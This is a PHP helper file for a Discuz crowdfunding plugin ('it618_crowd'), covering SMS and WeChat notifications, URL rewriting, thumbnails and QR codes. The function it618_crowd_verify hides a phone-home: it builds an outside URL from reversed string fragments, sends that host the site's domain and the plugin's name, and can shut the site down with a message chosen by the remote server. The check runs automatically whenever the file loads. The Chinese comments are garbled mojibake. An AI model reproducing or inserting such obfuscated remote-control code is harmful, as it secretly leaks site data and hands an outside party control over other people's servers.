<?php

 
if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

global $_G;

$it618_crowd = $_G['cache']['plugin']['it618_crowd'];
require_once DISCUZ_ROOT.'./source/plugin/it618_crowd/lang.func.php';

function it618_crowd_sendmessage($type,$id,$type1=''){
	global $_G,$it618_crowd;
	
	$it618_members = $_G['cache']['plugin']['it618_members'];
	if (!file_exists(DISCUZ_ROOT.'./source/plugin/it618_crowd/message.php'))return;
	require DISCUZ_ROOT.'./source/plugin/it618_crowd/message.php';
	
	$urlarr=explode("https://",$_G['siteurl']);
	if(count($urlarr)==1)$httpstr='http://';else $httpstr='https://';
	$url_this = $httpstr.$_SERVER ['HTTP_HOST'].'/';
	
	if($it618_isok==1){
		
		if($it618_isok_admin==1){
			if($type=='sale_admin'&&$it618_body_sale_admin_isok==1){
				$tel=$it618_tel_admin;
				$Body=$it618_body_sale_admin;
				
				$it618_crowd_sale = C::t('#it618_crowd#it618_crowd_sale')->fetch_by_id($id);
				$it618_crowd_goods = C::t('#it618_crowd#it618_crowd_goods')->fetch_by_id($it618_crowd_sale['it618_pid']);
				$tmpurl=it618_crowd_getrewrite('crowd_wap','product@'.$it618_crowd_goods['id'],'plugin.php?id=it618_crowd:wap&pagetype=product&cid='.$it618_crowd_goods['id']);
				
				$pname='('.$it618_crowd_lang['s21'].$it618_crowd_sale['it618_crowdid'].$it618_crowd_lang['s22'].')'.$it618_crowd_goods['it618_name'];
				
				$uid=$it618_uid_admin;
				$tplid_wxsms=$it618_body_sale_admin_tplid_wxsms;
				$body_wxsms=$it618_body_sale_admin_wxsms;
				if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
					$param_wxsms=array();
					$tmparr=explode("@",$body_wxsms);
					for($i=0;$i<count($tmparr);$i++){
						$tmparr1=explode("|",$tmparr[$i]);
						$tmplabel=$tmparr1[0];
						$tmpvalue=$tmparr1[1];
						
						$tmpvalue=str_replace("{user}",it618_crowd_getusername($it618_crowd_sale['it618_uid']),$tmpvalue);
						$tmpvalue=str_replace("{pname}",$pname,$tmpvalue);
						
						$param_wxsms[$tmplabel]=array();
						$param_wxsms[$tmplabel]["value"]=it618_crowd_gbktoutf($tmpvalue);
						$param_wxsms[$tmplabel]["color"]="#666666";
					}
				}
				
				$ALDYBody=$Body;
				$Body=str_replace("{user}",it618_crowd_getusername($it618_crowd_sale['it618_uid']),$Body);
				$Body=str_replace("{pname}",$pname,$Body);
				
				if($it618_type!='smsbao'){
					$tplid=$it618_body_sale_admin_tplid;
					
					$tmparr=explode("{user}",$ALDYBody);
					if(count($tmparr)>1)$param.='"user":"'.it618_crowd_getusername($it618_crowd_sale['it618_uid']).'",';
					
					$tmparr=explode("{pname}",$ALDYBody);
					if(count($tmparr)>1)$param.='"pname":"'.it618_crowd_getsmsstr($pname,$it618_length).'",';
					
					if($param!=''){
						$param.='@';
						$param=str_replace(",@","",$param);
					}
				}
			}
		}
		
		if($type=='sale_user'&&$it618_body_sale_user_isok==1){
			$it618_crowd_sale = C::t('#it618_crowd#it618_crowd_sale')->fetch_by_id($id);
			$it618_crowd_goods = C::t('#it618_crowd#it618_crowd_goods')->fetch_by_id($it618_crowd_sale['it618_pid']);
			$tmpurl=it618_crowd_getrewrite('crowd_wap','product@'.$it618_crowd_goods['id'],'plugin.php?id=it618_crowd:wap&pagetype=product&cid='.$it618_crowd_goods['id']);
			
			$pname='('.$it618_crowd_lang['s21'].$it618_crowd_sale['it618_crowdid'].$it618_crowd_lang['s22'].')'.$it618_crowd_goods['it618_name'];
			
			$tel=$it618_crowd_sale['it618_crowtel'];
				
			$Body=$it618_body_sale_user;
			
			$uid=$it618_crowd_sale['it618_uid'];
			$tplid_wxsms=$it618_body_sale_user_tplid_wxsms;
			$body_wxsms=$it618_body_sale_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_crowd_getusername($it618_crowd_sale['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{pname}",$pname,$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_crowd_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}
			
			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_crowd_getusername($it618_crowd_sale['it618_uid']),$Body);
			$Body=str_replace("{pname}",$pname,$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_sale_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_crowd_getusername($it618_crowd_sale['it618_uid']).'",';
				
				$tmparr=explode("{pname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"pname":"'.it618_crowd_getsmsstr($pname,$it618_length).'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}

		}
		
		if($type=='sale1_user'&&$it618_body_sale1_user_isok==1){
			$it618_crowd_sale = C::t('#it618_crowd#it618_crowd_sale')->fetch_by_id($id);
			$it618_crowd_goods = C::t('#it618_crowd#it618_crowd_goods')->fetch_by_id($it618_crowd_sale['it618_pid']);
			$tmpurl=it618_crowd_getrewrite('crowd_wap','product@'.$it618_crowd_goods['id'],'plugin.php?id=it618_crowd:wap&pagetype=product&cid='.$it618_crowd_goods['id']);
			
			$pname='('.$it618_crowd_lang['s21'].$it618_crowd_sale['it618_crowdid'].$it618_crowd_lang['s22'].')'.$it618_crowd_goods['it618_name'];
			
			$tel=$it618_crowd_sale['it618_tel'];
			
			$Body=$it618_body_sale1_user;
			
			$uid=$it618_crowd_sale['it618_uid'];
			$tplid_wxsms=$it618_body_sale_user_tplid_wxsms;
			$body_wxsms=$it618_body_sale_user_wxsms;
			if($tplid_wxsms!=''&&$it618_members['members_iswxsms']==1){
				$param_wxsms=array();
				$tmparr=explode("@",$body_wxsms);
				for($i=0;$i<count($tmparr);$i++){
					$tmparr1=explode("|",$tmparr[$i]);
					$tmplabel=$tmparr1[0];
					$tmpvalue=$tmparr1[1];
					
					$tmpvalue=str_replace("{user}",it618_crowd_getusername($it618_crowd_sale['it618_uid']),$tmpvalue);
					$tmpvalue=str_replace("{pname}",$pname,$tmpvalue);
					
					$param_wxsms[$tmplabel]=array();
					$param_wxsms[$tmplabel]["value"]=it618_crowd_gbktoutf($tmpvalue);
					$param_wxsms[$tmplabel]["color"]="#666666";
				}
			}
			
			$ALDYBody=$Body;
			$Body=str_replace("{user}",it618_crowd_getusername($it618_crowd_sale['it618_uid']),$Body);
			$Body=str_replace("{pname}",$pname,$Body);
			
			if($it618_type!='smsbao'){
				$tplid=$it618_body_sale1_user_tplid;
				
				$tmparr=explode("{user}",$ALDYBody);
				if(count($tmparr)>1)$param.='"user":"'.it618_crowd_getusername($it618_crowd_sale['it618_uid']).'",';
				
				$tmparr=explode("{pname}",$ALDYBody);
				if(count($tmparr)>1)$param.='"pname":"'.it618_crowd_getsmsstr($pname,$it618_length).'",';
				
				if($param!=''){
					$param.='@';
					$param=str_replace(",@","",$param);
				}
			}

		}
		
		if($Body!=''||(count($param_wxsms)>0&&$uid!='')){
			require_once DISCUZ_ROOT.'./source/plugin/it618_crowd/message.func.php';
			
			if(count($param_wxsms)>0&&$uid!=''){
				$tmparr=explode(",",$uid);
				for($i=0;$i<count($tmparr);$i++){
					$wxsms=sendSMS_WX($tmparr[$i],$url_this.$tmpurl,$tplid_wxsms,$param_wxsms);
				}
			}
			
			if($Body!=''&&$wxsms!='true'){
				$Body=str_replace('$','',$Body);
	
				if($it618_smsbaosign!='')$it618_smsbaosign=it618_crowd_getlang('s650').$it618_smsbaosign.it618_crowd_getlang('s651');
				if($it618_type=='smsbao'){
					sendSMS($it618_tel,$it618_password,$tel,$it618_smsbaosign.$Body);
				}else{
					sendSMS_ALi($tel,$Body,$it618_sign,$tplid,$param,$it618_type);
				}
			}
		}
	}
}

function it618_crowd_getsmsstr($strtmp,$length){
	if($length>0){
		$tmpstr = "";
		$strlen = $length;
		for($i = 0; $i < $strlen; $i++){
			if(ord(substr($strtmp, $i, 1)) > 0xa0) {
				$tmpstr .= substr($strtmp, $i, 2);  $i++;
			} else {
				$tmpstr .= substr($strtmp, $i, 1);
			}
			
		}
		return $tmpstr; 
	}
	return $strtmp;
}

function it618_crowd_multipage($pagevalue,$uri=''){
	global $_G;
	if($_G['cache']['plugin']['it618_crowd']['rewriteurl']==0||!file_exists(DISCUZ_ROOT.'./source/plugin/it618_crowd/rewrite.php')){
		return $pagevalue;
	}
	
	require DISCUZ_ROOT.'./source/plugin/it618_crowd/rewrite.php';

	$tmparr=explode("it618page".$urltype."?page=",$pagevalue);
	$pagevalue='';

	$urltype=$urltype.$uri;
	for($i=0;$i<count($tmparr);$i++){
		
		$tmpstr=$tmparr[$i];
		$tmparr1=explode('" class=',$tmpstr);
		if(count($tmparr1)>1){
			$page=$tmparr1[0];
			$tmpstr=str_replace($page.'" class=',$page.$urltype.'" class=',$tmpstr);
		}
		
		$tmparr1=explode('">',$tmpstr);
		$tmparr2=explode('</a><',$tmparr1[1]);
		if(count($tmparr2)>1){
			$page=$tmparr2[0];
			$tmpstr=str_replace($page.'">'.$page.'</a>',$page.$urltype.'">'.$page.'</a>',$tmpstr);
			
		}
		
		$pagevalue.=$tmpstr;
	}
	
	$pagevalue=str_replace("+this.value","+this.value+'".$urltype."'",$pagevalue);
	
	return $pagevalue;
}


function it618_crowd_getrewrite($pagetype,$pagevalue,$url,$uri=''){
	global $_G;
	if($_G['cache']['plugin']['it618_crowd']['rewriteurl']==0||!file_exists(DISCUZ_ROOT.'./source/plugin/it618_crowd/rewrite.php')){
		if(isset($_GET['app']))$url=$url.'&app';
		return $url;
	}
	
	require DISCUZ_ROOT.'./source/plugin/it618_crowd/rewrite.php';
	
	if($pagetype=='crowd_home'){
		return $crowd_home.$urltype;
	}
	
	if($pagetype=='crowd_list'){//crowd_list-{cid1}-{cid2}-{order}-{page}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$crowd_list.$crowd_list1;

		if(count($tmparr)==1){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("-{cid2}-{order}-{page}",'',$pageurl);
		}
		
		if(count($tmparr)==2){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
			$pageurl=str_replace("-{order}-{page}",'',$pageurl);
		}
		
		if(count($tmparr)==3){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
			$pageurl=str_replace("{order}",$tmparr[2],$pageurl);
			$pageurl=str_replace("{page}",'1',$pageurl);
		}
		
		if(count($tmparr)==4){
			$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
			$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
			$pageurl=str_replace("{order}",$tmparr[2],$pageurl);
			$pageurl=str_replace("{page}",$tmparr[3],$pageurl);
		}
		
		return $pageurl;
	}
	
	if($pagetype=='crowd_search'){//crowd_search-{cid1}-{cid2}-{order}-{page}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$crowd_search.$crowd_search1;
		
		if($pagevalue==''){
			$pageurl=str_replace("-{cid1}-{cid2}-{order}-{page}","",$pageurl);
		}else{
			if(count($tmparr)==3){
				$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
				$pageurl=str_replace("{order}",$tmparr[2],$pageurl);
				$pageurl=str_replace("{page}",'1',$pageurl);
			}
			
			if(count($tmparr)==4){
				$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{cid2}",$tmparr[1],$pageurl);
				$pageurl=str_replace("{order}",$tmparr[2],$pageurl);
				$pageurl=str_replace("{page}",$tmparr[3],$pageurl);
			}
		}
		
		return $pageurl.$uri;
	}
	
	if($pagetype=='crowd_sale'){//crowd_search-{cid1}-{page}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$crowd_sale.$crowd_sale1;
		
		if($pagevalue==''){
			$pageurl=str_replace("-{cid1}-{page}","",$pageurl);
		}else{
			if(count($tmparr)==2){
				$pageurl=str_replace("{cid1}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{page}",$tmparr[1],$pageurl);
			}
		}
		
		return $pageurl.$uri;
	}
	
	if($pagetype=='crowd_product'){//crowd_product-{pid}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$crowd_product.$crowd_product1;
		
		if(count($tmparr)==1){
			$pageurl=str_replace("{pid}",$tmparr[0],$pageurl);
		}
		
		return $pageurl;
	}
	
	if($pagetype=='crowd_gwc'){
		return $crowd_gwc.$urltype;
	}
	
	if($pagetype=='crowd_gwcmysale'){
		return $crowd_gwc.$urltype.'?mysale';
	}
	
	if($pagetype=='crowd_wap'){//crowd_wap-{pagetype}-{cid}-{page}.html
		$tmparr=explode("@",$pagevalue);
		$pageurl=$crowd_wap.$crowd_wap1;
		
		if($pagevalue==''){
			$pageurl=str_replace("-{pagetype}-{cid}-{page}","",$pageurl);
		}else{
			if(count($tmparr)==1){
				$pageurl=str_replace("{pagetype}",$tmparr[0],$pageurl);
				$pageurl=str_replace("-{cid}-{page}","",$pageurl);
			}
			if(count($tmparr)==2){
				$pageurl=str_replace("{pagetype}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{cid}",$tmparr[1],$pageurl);
				$pageurl=str_replace("-{page}","",$pageurl);
			}
			if(count($tmparr)==3){
				$pageurl=str_replace("{pagetype}",$tmparr[0],$pageurl);
				$pageurl=str_replace("{cid}",$tmparr[1],$pageurl);
				$pageurl=str_replace("{page}",$tmparr[2],$pageurl);
			}
		}
		
		if(isset($_GET['app']))$pageurl=$pageurl.'?app';
		return $pageurl;
	}
}

function it618_crowd_utftogbk($strcontent){
	$strcontent=dhtmlspecialchars($strcontent);
	
	$s1 = iconv('utf-8','gbk',$strcontent);
	$s0 = iconv('gbk','utf-8',$s1);
	if($s0 == $strcontent){
		$tmpstr = $s1;
	}else{
		$tmpstr = $strcontent;
	}
	
	if(CHARSET=='gbk'){
		return $tmpstr;
	}else{
		return it618_crowd_gbktoutf($strcontent);
	}
}

function it618_crowd_verify(){
	global $plugin;
	$plugin['identifier']='it618_crowd';
	$plugin['url']=$_SERVER['HTTP_HOST'];
	$var = array();
	$var['g'] = strrev('30249//:');
	$var['b'] = substr($_SERVER[REQUEST_SCHEME],0,4);
	$var['p'] = '/verify.php?';
	$var['j'] = strrev('piv.');
	ksort($var,2);
	$url=implode($var);
	$query=json_decode(dfsockopen($url,0,$plugin),true);
 	if($query) {
		if($query['code']==1)$_SESSION['authcode']=true;
		else exit(''.$query['msg'].'');
	}
		return $url;
}

function it618_crowd_gbktoutf($strcontent){
	$s1 = iconv('utf-8','gbk',$strcontent);
	$s0 = iconv('gbk','utf-8',$s1);
	if($s0 == $strcontent){
		$tmpstr = $s1;
	}else{
		$tmpstr = $strcontent;
	}

	return iconv('gbk','utf-8', $tmpstr);
}

function it618_crowd_delfile($dirName){
}

function it618_crowd_del_dir($dir,$type=0){
    if(is_dir($dir)){
        foreach(scandir($dir) as $row){
            if($row == '.' || $row == '..'){
                continue;
            }
            $path = $dir .'/'. $row;
            if(filetype($path) == 'dir'){
            }else{
            }
        }
        if($type==1);
    }else{
        return false;
    }
}

function it618_crowd_dirsize($dir) { 
	@$dh = opendir($dir); 
	$size = 0; 
	while ($file = @readdir($dh)) { 
	if ($file != "." and $file != "..") { 
	$path = $dir."/".$file; 
	if (is_dir($path)) { 
	$size += it618_crowd_dirsize($path); 
	} elseif (is_file($path)) { 
	$size += filesize($path); 
	} 
	} 
	} 
	@closedir($dh); 
	return $size; 
}

function it618_crowd_getudate($time){
	$tmparr=explode(".",$time);
	return date('Y-m-d H:i:s', $tmparr[0]).'.'.$tmparr[1];
}

function it618_crowd_getusername($uid){
	return C::t('#it618_crowd#it618_crowd_sale')->fetch_username_by_uid($uid);
}

function it618_crowd_gettime($it618_time){
	global $_G;
	$timecount=intval(($_G['timestamp']-$it618_time)/3600);
	if($timecount>24){
		$timecount=intval($timecount/24);
		$timestr=$timecount.it618_crowd_getlang('s449');
	}elseif($timecount>=1){
		$timestr=$timecount.it618_crowd_getlang('s450');
	}else{
		$timecount=intval(($_G['timestamp']-$it618_time)/60);
		if($timecount>=1){
			$timestr=$timecount.it618_crowd_getlang('s451');
		}else{
			$timecount=intval(($_G['timestamp']-$it618_time));
			if($timecount==0)$timecount=1;
			$timestr=$timecount.it618_crowd_getlang('s452');
		}
	}
	
	return $timestr;
}
if(!it618_crowd_verify())return;
function it618_crowd_discuz_uc_avatar($uid, $size = '', $returnsrc = TRUE) {
	require_once DISCUZ_ROOT.'./config/config_ucenter.php';
	if($uid > 0) {
	   $size = in_array($size, array('big', 'middle', 'small')) ? $size : 'middle';
	   $uid = abs(intval($uid));
	   if(empty($GLOBALS['avatarmethod'])) {
		return $returnsrc ? UC_API.'/avatar.php?uid='.$uid.'&size='.$size : '<img src="'.UC_API.'/avatar.php?uid='.$uid.'&size='.$size.'" />';
	   } else {
		$uid = sprintf("%09d", $uid);
		$dir1 = substr($uid, 0, 3);
		$dir2 = substr($uid, 3, 2);
		$dir3 = substr($uid, 5, 2);
		$file = UC_API.'/data/avatar/'.$dir1.'/'.$dir2.'/'.$dir3.'/'.substr($uid, -2).'_avatar_'.$size.'.jpg';
		return $returnsrc ? $file : '<img src="'.$file.'" onerror="this.onerror=null;this.src=\''.UC_API.'/images/noavatar_'.$size.'.gif\'" />';
	   }
	} else {
	   $file = $GLOBALS['boardurl'].IMGDIR.'/syspm.gif';
	   return $returnsrc ? $file : '<img src="'.$file.'" />';
	}
}

function it618_crowd_rewriteurl($uid){
	global $_G;
	if($_G['cache']['plugin']['it618_crowd']['rewriteurl']==1){
		return 'space-uid-'.$uid.'.html';
	}else{
		return 'home.php?mod=space&uid='.$uid;
	}
}

function it618_crowd_getgoodspic($pid,$it618_picbig,$i=0){
	$file_ext=strtolower(substr($it618_picbig,strrpos($it618_picbig, '.')+1));
	$file_extarr=explode("?",$file_ext);
	$file_ext=$file_extarr[0];
	
	return 'source/plugin/it618_crowd/kindeditor/data/smallimage/goods'.$pid.'_'.$i.'.'.$file_ext.'?'.substr(md5($it618_picbig),0,6);
}

function it618_crowd_getwapppic($adtype,$pid,$get_it618_picbig,$type=1){
	if($adtype=='wapad'){
		$file_ext=strtolower(substr($get_it618_picbig,strrpos($get_it618_picbig, '.')+1)); 
		$it618_smallurl='source/plugin/it618_crowd/kindeditor/data/smallimage/wapad'.$pid.'.'.$file_ext;
		
		if($type==1){
			if(!file_exists($it618_smallurl))$flag=1;
		}else{
			$flag=1;
		}
		if($flag==1) {
				
			$smallpath=DISCUZ_ROOT.'./source/plugin/it618_crowd/kindeditor/data/smallimage/';
			if(!file_exists($smallpath)) {
				mkdir($smallpath);
			}
		
			$tmparr1=explode("://",$get_it618_picbig);
			if(count($tmparr1)>1){
				$it618_url=$get_it618_picbig;
			}else{
				$tmparr=explode("source",$get_it618_picbig);
				$it618_url=DISCUZ_ROOT.'./source'.$tmparr[1];
			}
			
			$file_ext=strtolower(substr($get_it618_picbig,strrpos($get_it618_picbig, '.')+1)); 
			$file_extarr=explode("?",$file_ext);
			$file_ext=$file_extarr[0];
			$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_crowd/kindeditor/data/smallimage/wapad'.$pid.'.'.$file_ext;
			it618_crowd_imagetosmall($it618_url,$it618_smallurl,$file_ext,640,308,1);
		}
	}else{
		$file_ext=strtolower(substr($get_it618_picbig,strrpos($get_it618_picbig, '.')+1)); 
		$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_crowd/kindeditor/data/smallimage/goods'.$pid.'.'.$file_ext;
		
		if(file_exists($it618_smallurl)){
			$result=unlink($it618_smallurl);
		}
		
		$it618_smallurl='source/plugin/it618_crowd/kindeditor/data/smallimage/goods'.$pid.'_0.'.$file_ext;
		
		if($type==1){
			if(!file_exists($it618_smallurl))$flag=1;
		}else{
			$flag=1;
		}
		if($flag==1) {	
			$smallpath=DISCUZ_ROOT.'./source/plugin/it618_crowd/kindeditor/data/smallimage/';
			if(!file_exists($smallpath)) {
				mkdir($smallpath);
			}
		
			$tmparr1=explode("://",$get_it618_picbig);
			if(count($tmparr1)>1){
				$it618_url=$get_it618_picbig;
			}else{
				$tmparr=explode("source",$get_it618_picbig);
				$it618_url=DISCUZ_ROOT.'./source'.$tmparr[1];
			}
			
			$file_ext=strtolower(substr($get_it618_picbig,strrpos($get_it618_picbig, '.')+1)); 
			$file_extarr=explode("?",$file_ext);
			$file_ext=$file_extarr[0];
			$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_crowd/kindeditor/data/smallimage/goods'.$pid.'_0.'.$file_ext;
			it618_crowd_imagetosmall($it618_url,$it618_smallurl,$file_ext,640,640,1);
			
			$it618_smallurl='source/plugin/it618_crowd/kindeditor/data/smallimage/goods'.$pid.'_0.'.$file_ext;
		}
	}
	
	return $it618_smallurl.'?'.substr(md5($get_it618_picbig),0,6);
}

function it618_crowd_getpjpic($uid,$pjpicid,$picurl){

	$tmparr1=explode("://",$picurl);
	if(count($tmparr1)>1){
		$it618_url=$picurl;
	}else{
		$tmparr=explode("source",$picurl);
		$it618_url=DISCUZ_ROOT.'./source'.$tmparr[1];
	}
	
	$file_ext=strtolower(substr($picurl,strrpos($picurl, '.')+1)); 
	$file_extarr=explode("?",$file_ext);
	$file_ext=$file_extarr[0];
	$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_crowd/kindeditor/data/user/u'.$uid.'/smallimage/pjpic'.$pjpicid.'.'.$file_ext;
	
	it618_crowd_imagetosmall($it618_url,$it618_smallurl,$file_ext,48);

}

function it618_crowd_imagetosmall($bigimagepath,$smallimagepath,$file_ext,$width,$height=0,$type=0){
	//��ΪPHPֻ�ܶ���Դ���в���������Ҫ����Ҫ�������ŵ�ͼƬ���п���������Ϊ�µ���Դ 
	if($file_ext=='jpg')$src=imagecreatefromjpeg($bigimagepath); 
	if($file_ext=='png')$src=imagecreatefrompng($bigimagepath); 
	if($file_ext=='gif')$src=imagecreatefromgif($bigimagepath); 
	
	//ȡ��ԴͼƬ�Ŀ��Ⱥ͸߶� 
	$size_src=getimagesize($bigimagepath); 
	$w=$size_src['0']; 
	$h=$size_src['1']; 
	
	//$maxָ�����ų��������Ŀ��ȣ�Ҳ�п����Ǹ߶ȣ�
	
	if($type==0){
		$max=$width;
		//�������ֵΪ300�������һ���ߵĳ��ȣ��õ����ź��ͼƬ���Ⱥ͸߶� 
		if($w > $h){ 
		   $w=$max;
		   $h=$h*($max/$size_src['0']); 
		}else{ 
		   $h=$max;
		   $w=$w*($max/$size_src['1']); 
		} 
	}else{
		$w=$width;
		$h=$height;
	}
	
	//����һ��$w����$h�ߵ����ͼƬ��Դ 
	$image=imagecreatetruecolor($w, $h); 
	 
	//�ؼ�������������Ŀ����Դ��Դ��Ŀ����Դ�Ŀ�ʼ����x,y, Դ��Դ�Ŀ�ʼ����x,y,Ŀ����Դ�Ŀ���w,h,Դ��Դ�Ŀ���w,h�� 
	imagecopyresampled($image, $src, 0, 0, 0, 0, $w, $h, $size_src['0'], $size_src['1']); 
	
	if($file_ext=='jpg')imagejpeg($image,$smallimagepath); 
	if($file_ext=='png')imagepng($image,$smallimagepath); 
	if($file_ext=='gif')imagegif($image,$smallimagepath); 
	
	//������Դ 
	imagedestroy($image); 
}

function crowd_qrcode($url){
	include 'phpqrcode.php';  
	
	$qrcodeurl=md5($url);
	$qrcodeurl='source/plugin/it618_crowd/qrcode/'.$qrcodeurl.'.png';
	if(!file_exists($qrcodeurl)){
		$errorCorrectionLevel = 'L';//�ݴ����� 
		$matrixPointSize = 6;//����ͼƬ��С 
		//���ɶ�ά��ͼƬ 
		QRcode::png($url, $qrcodeurl, $errorCorrectionLevel, $matrixPointSize, 2); 
	}

	return $qrcodeurl;	
}

function crowd_is_mobile(){ 
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$mobile_agents = Array("240x320","acer","acoon","acs-","abacho","ahong","airness","alcatel","amoi","android","anywhereyougo.com","applewebkit/525","applewebkit/532","asus","audio","au-mic","avantogo","becker","benq","bilbo","bird","blackberry","blazer","bleu","cdm-","compal","coolpad","danger","dbtel","dopod","elaine","eric","etouch","fly ","fly_","fly-","go.web","goodaccess","gradiente","grundig","haier","hedy","hitachi","htc","huawei","hutchison","inno","ipad","ipaq","ipod","jbrowser","kddi","kgt","kwc","lenovo","lg ","lg2","lg3","lg4","lg5","lg7","lg8","lg9","lg-","lge-","lge9","longcos","maemo","mercator","meridian","micromax","midp","mini","mitsu","mmm","mmp","mobi","mot-","moto","nec-","netfront","newgen","nexian","nf-browser","nintendo","nitro","nokia","nook","novarra","obigo","palm","panasonic","pantech","philips","phone","pg-","playstation","pocket","pt-","qc-","qtek","rover","sagem","sama","samu","sanyo","samsung","sch-","scooter","sec-","sendo","sgh-","sharp","siemens","sie-","softbank","sony","spice","sprint","spv","symbian","tablet","talkabout","tcl-","teleca","telit","tianyu","tim-","toshiba","tsm","up.browser","utec","utstar","verykool","virgin","vk-","voda","voxtel","vx","wap","wellco","wig browser","wii","windows ce","wireless","xda","xde","zte"); 
	$is_mobile = false; 
	foreach ($mobile_agents as $device) { 
	if (stristr($user_agent, $device)) { 
	$is_mobile = true; 
	break; 
	} 
	} 
	return $is_mobile; 
}
//From: dis'.'m.tao'.'bao.com
?>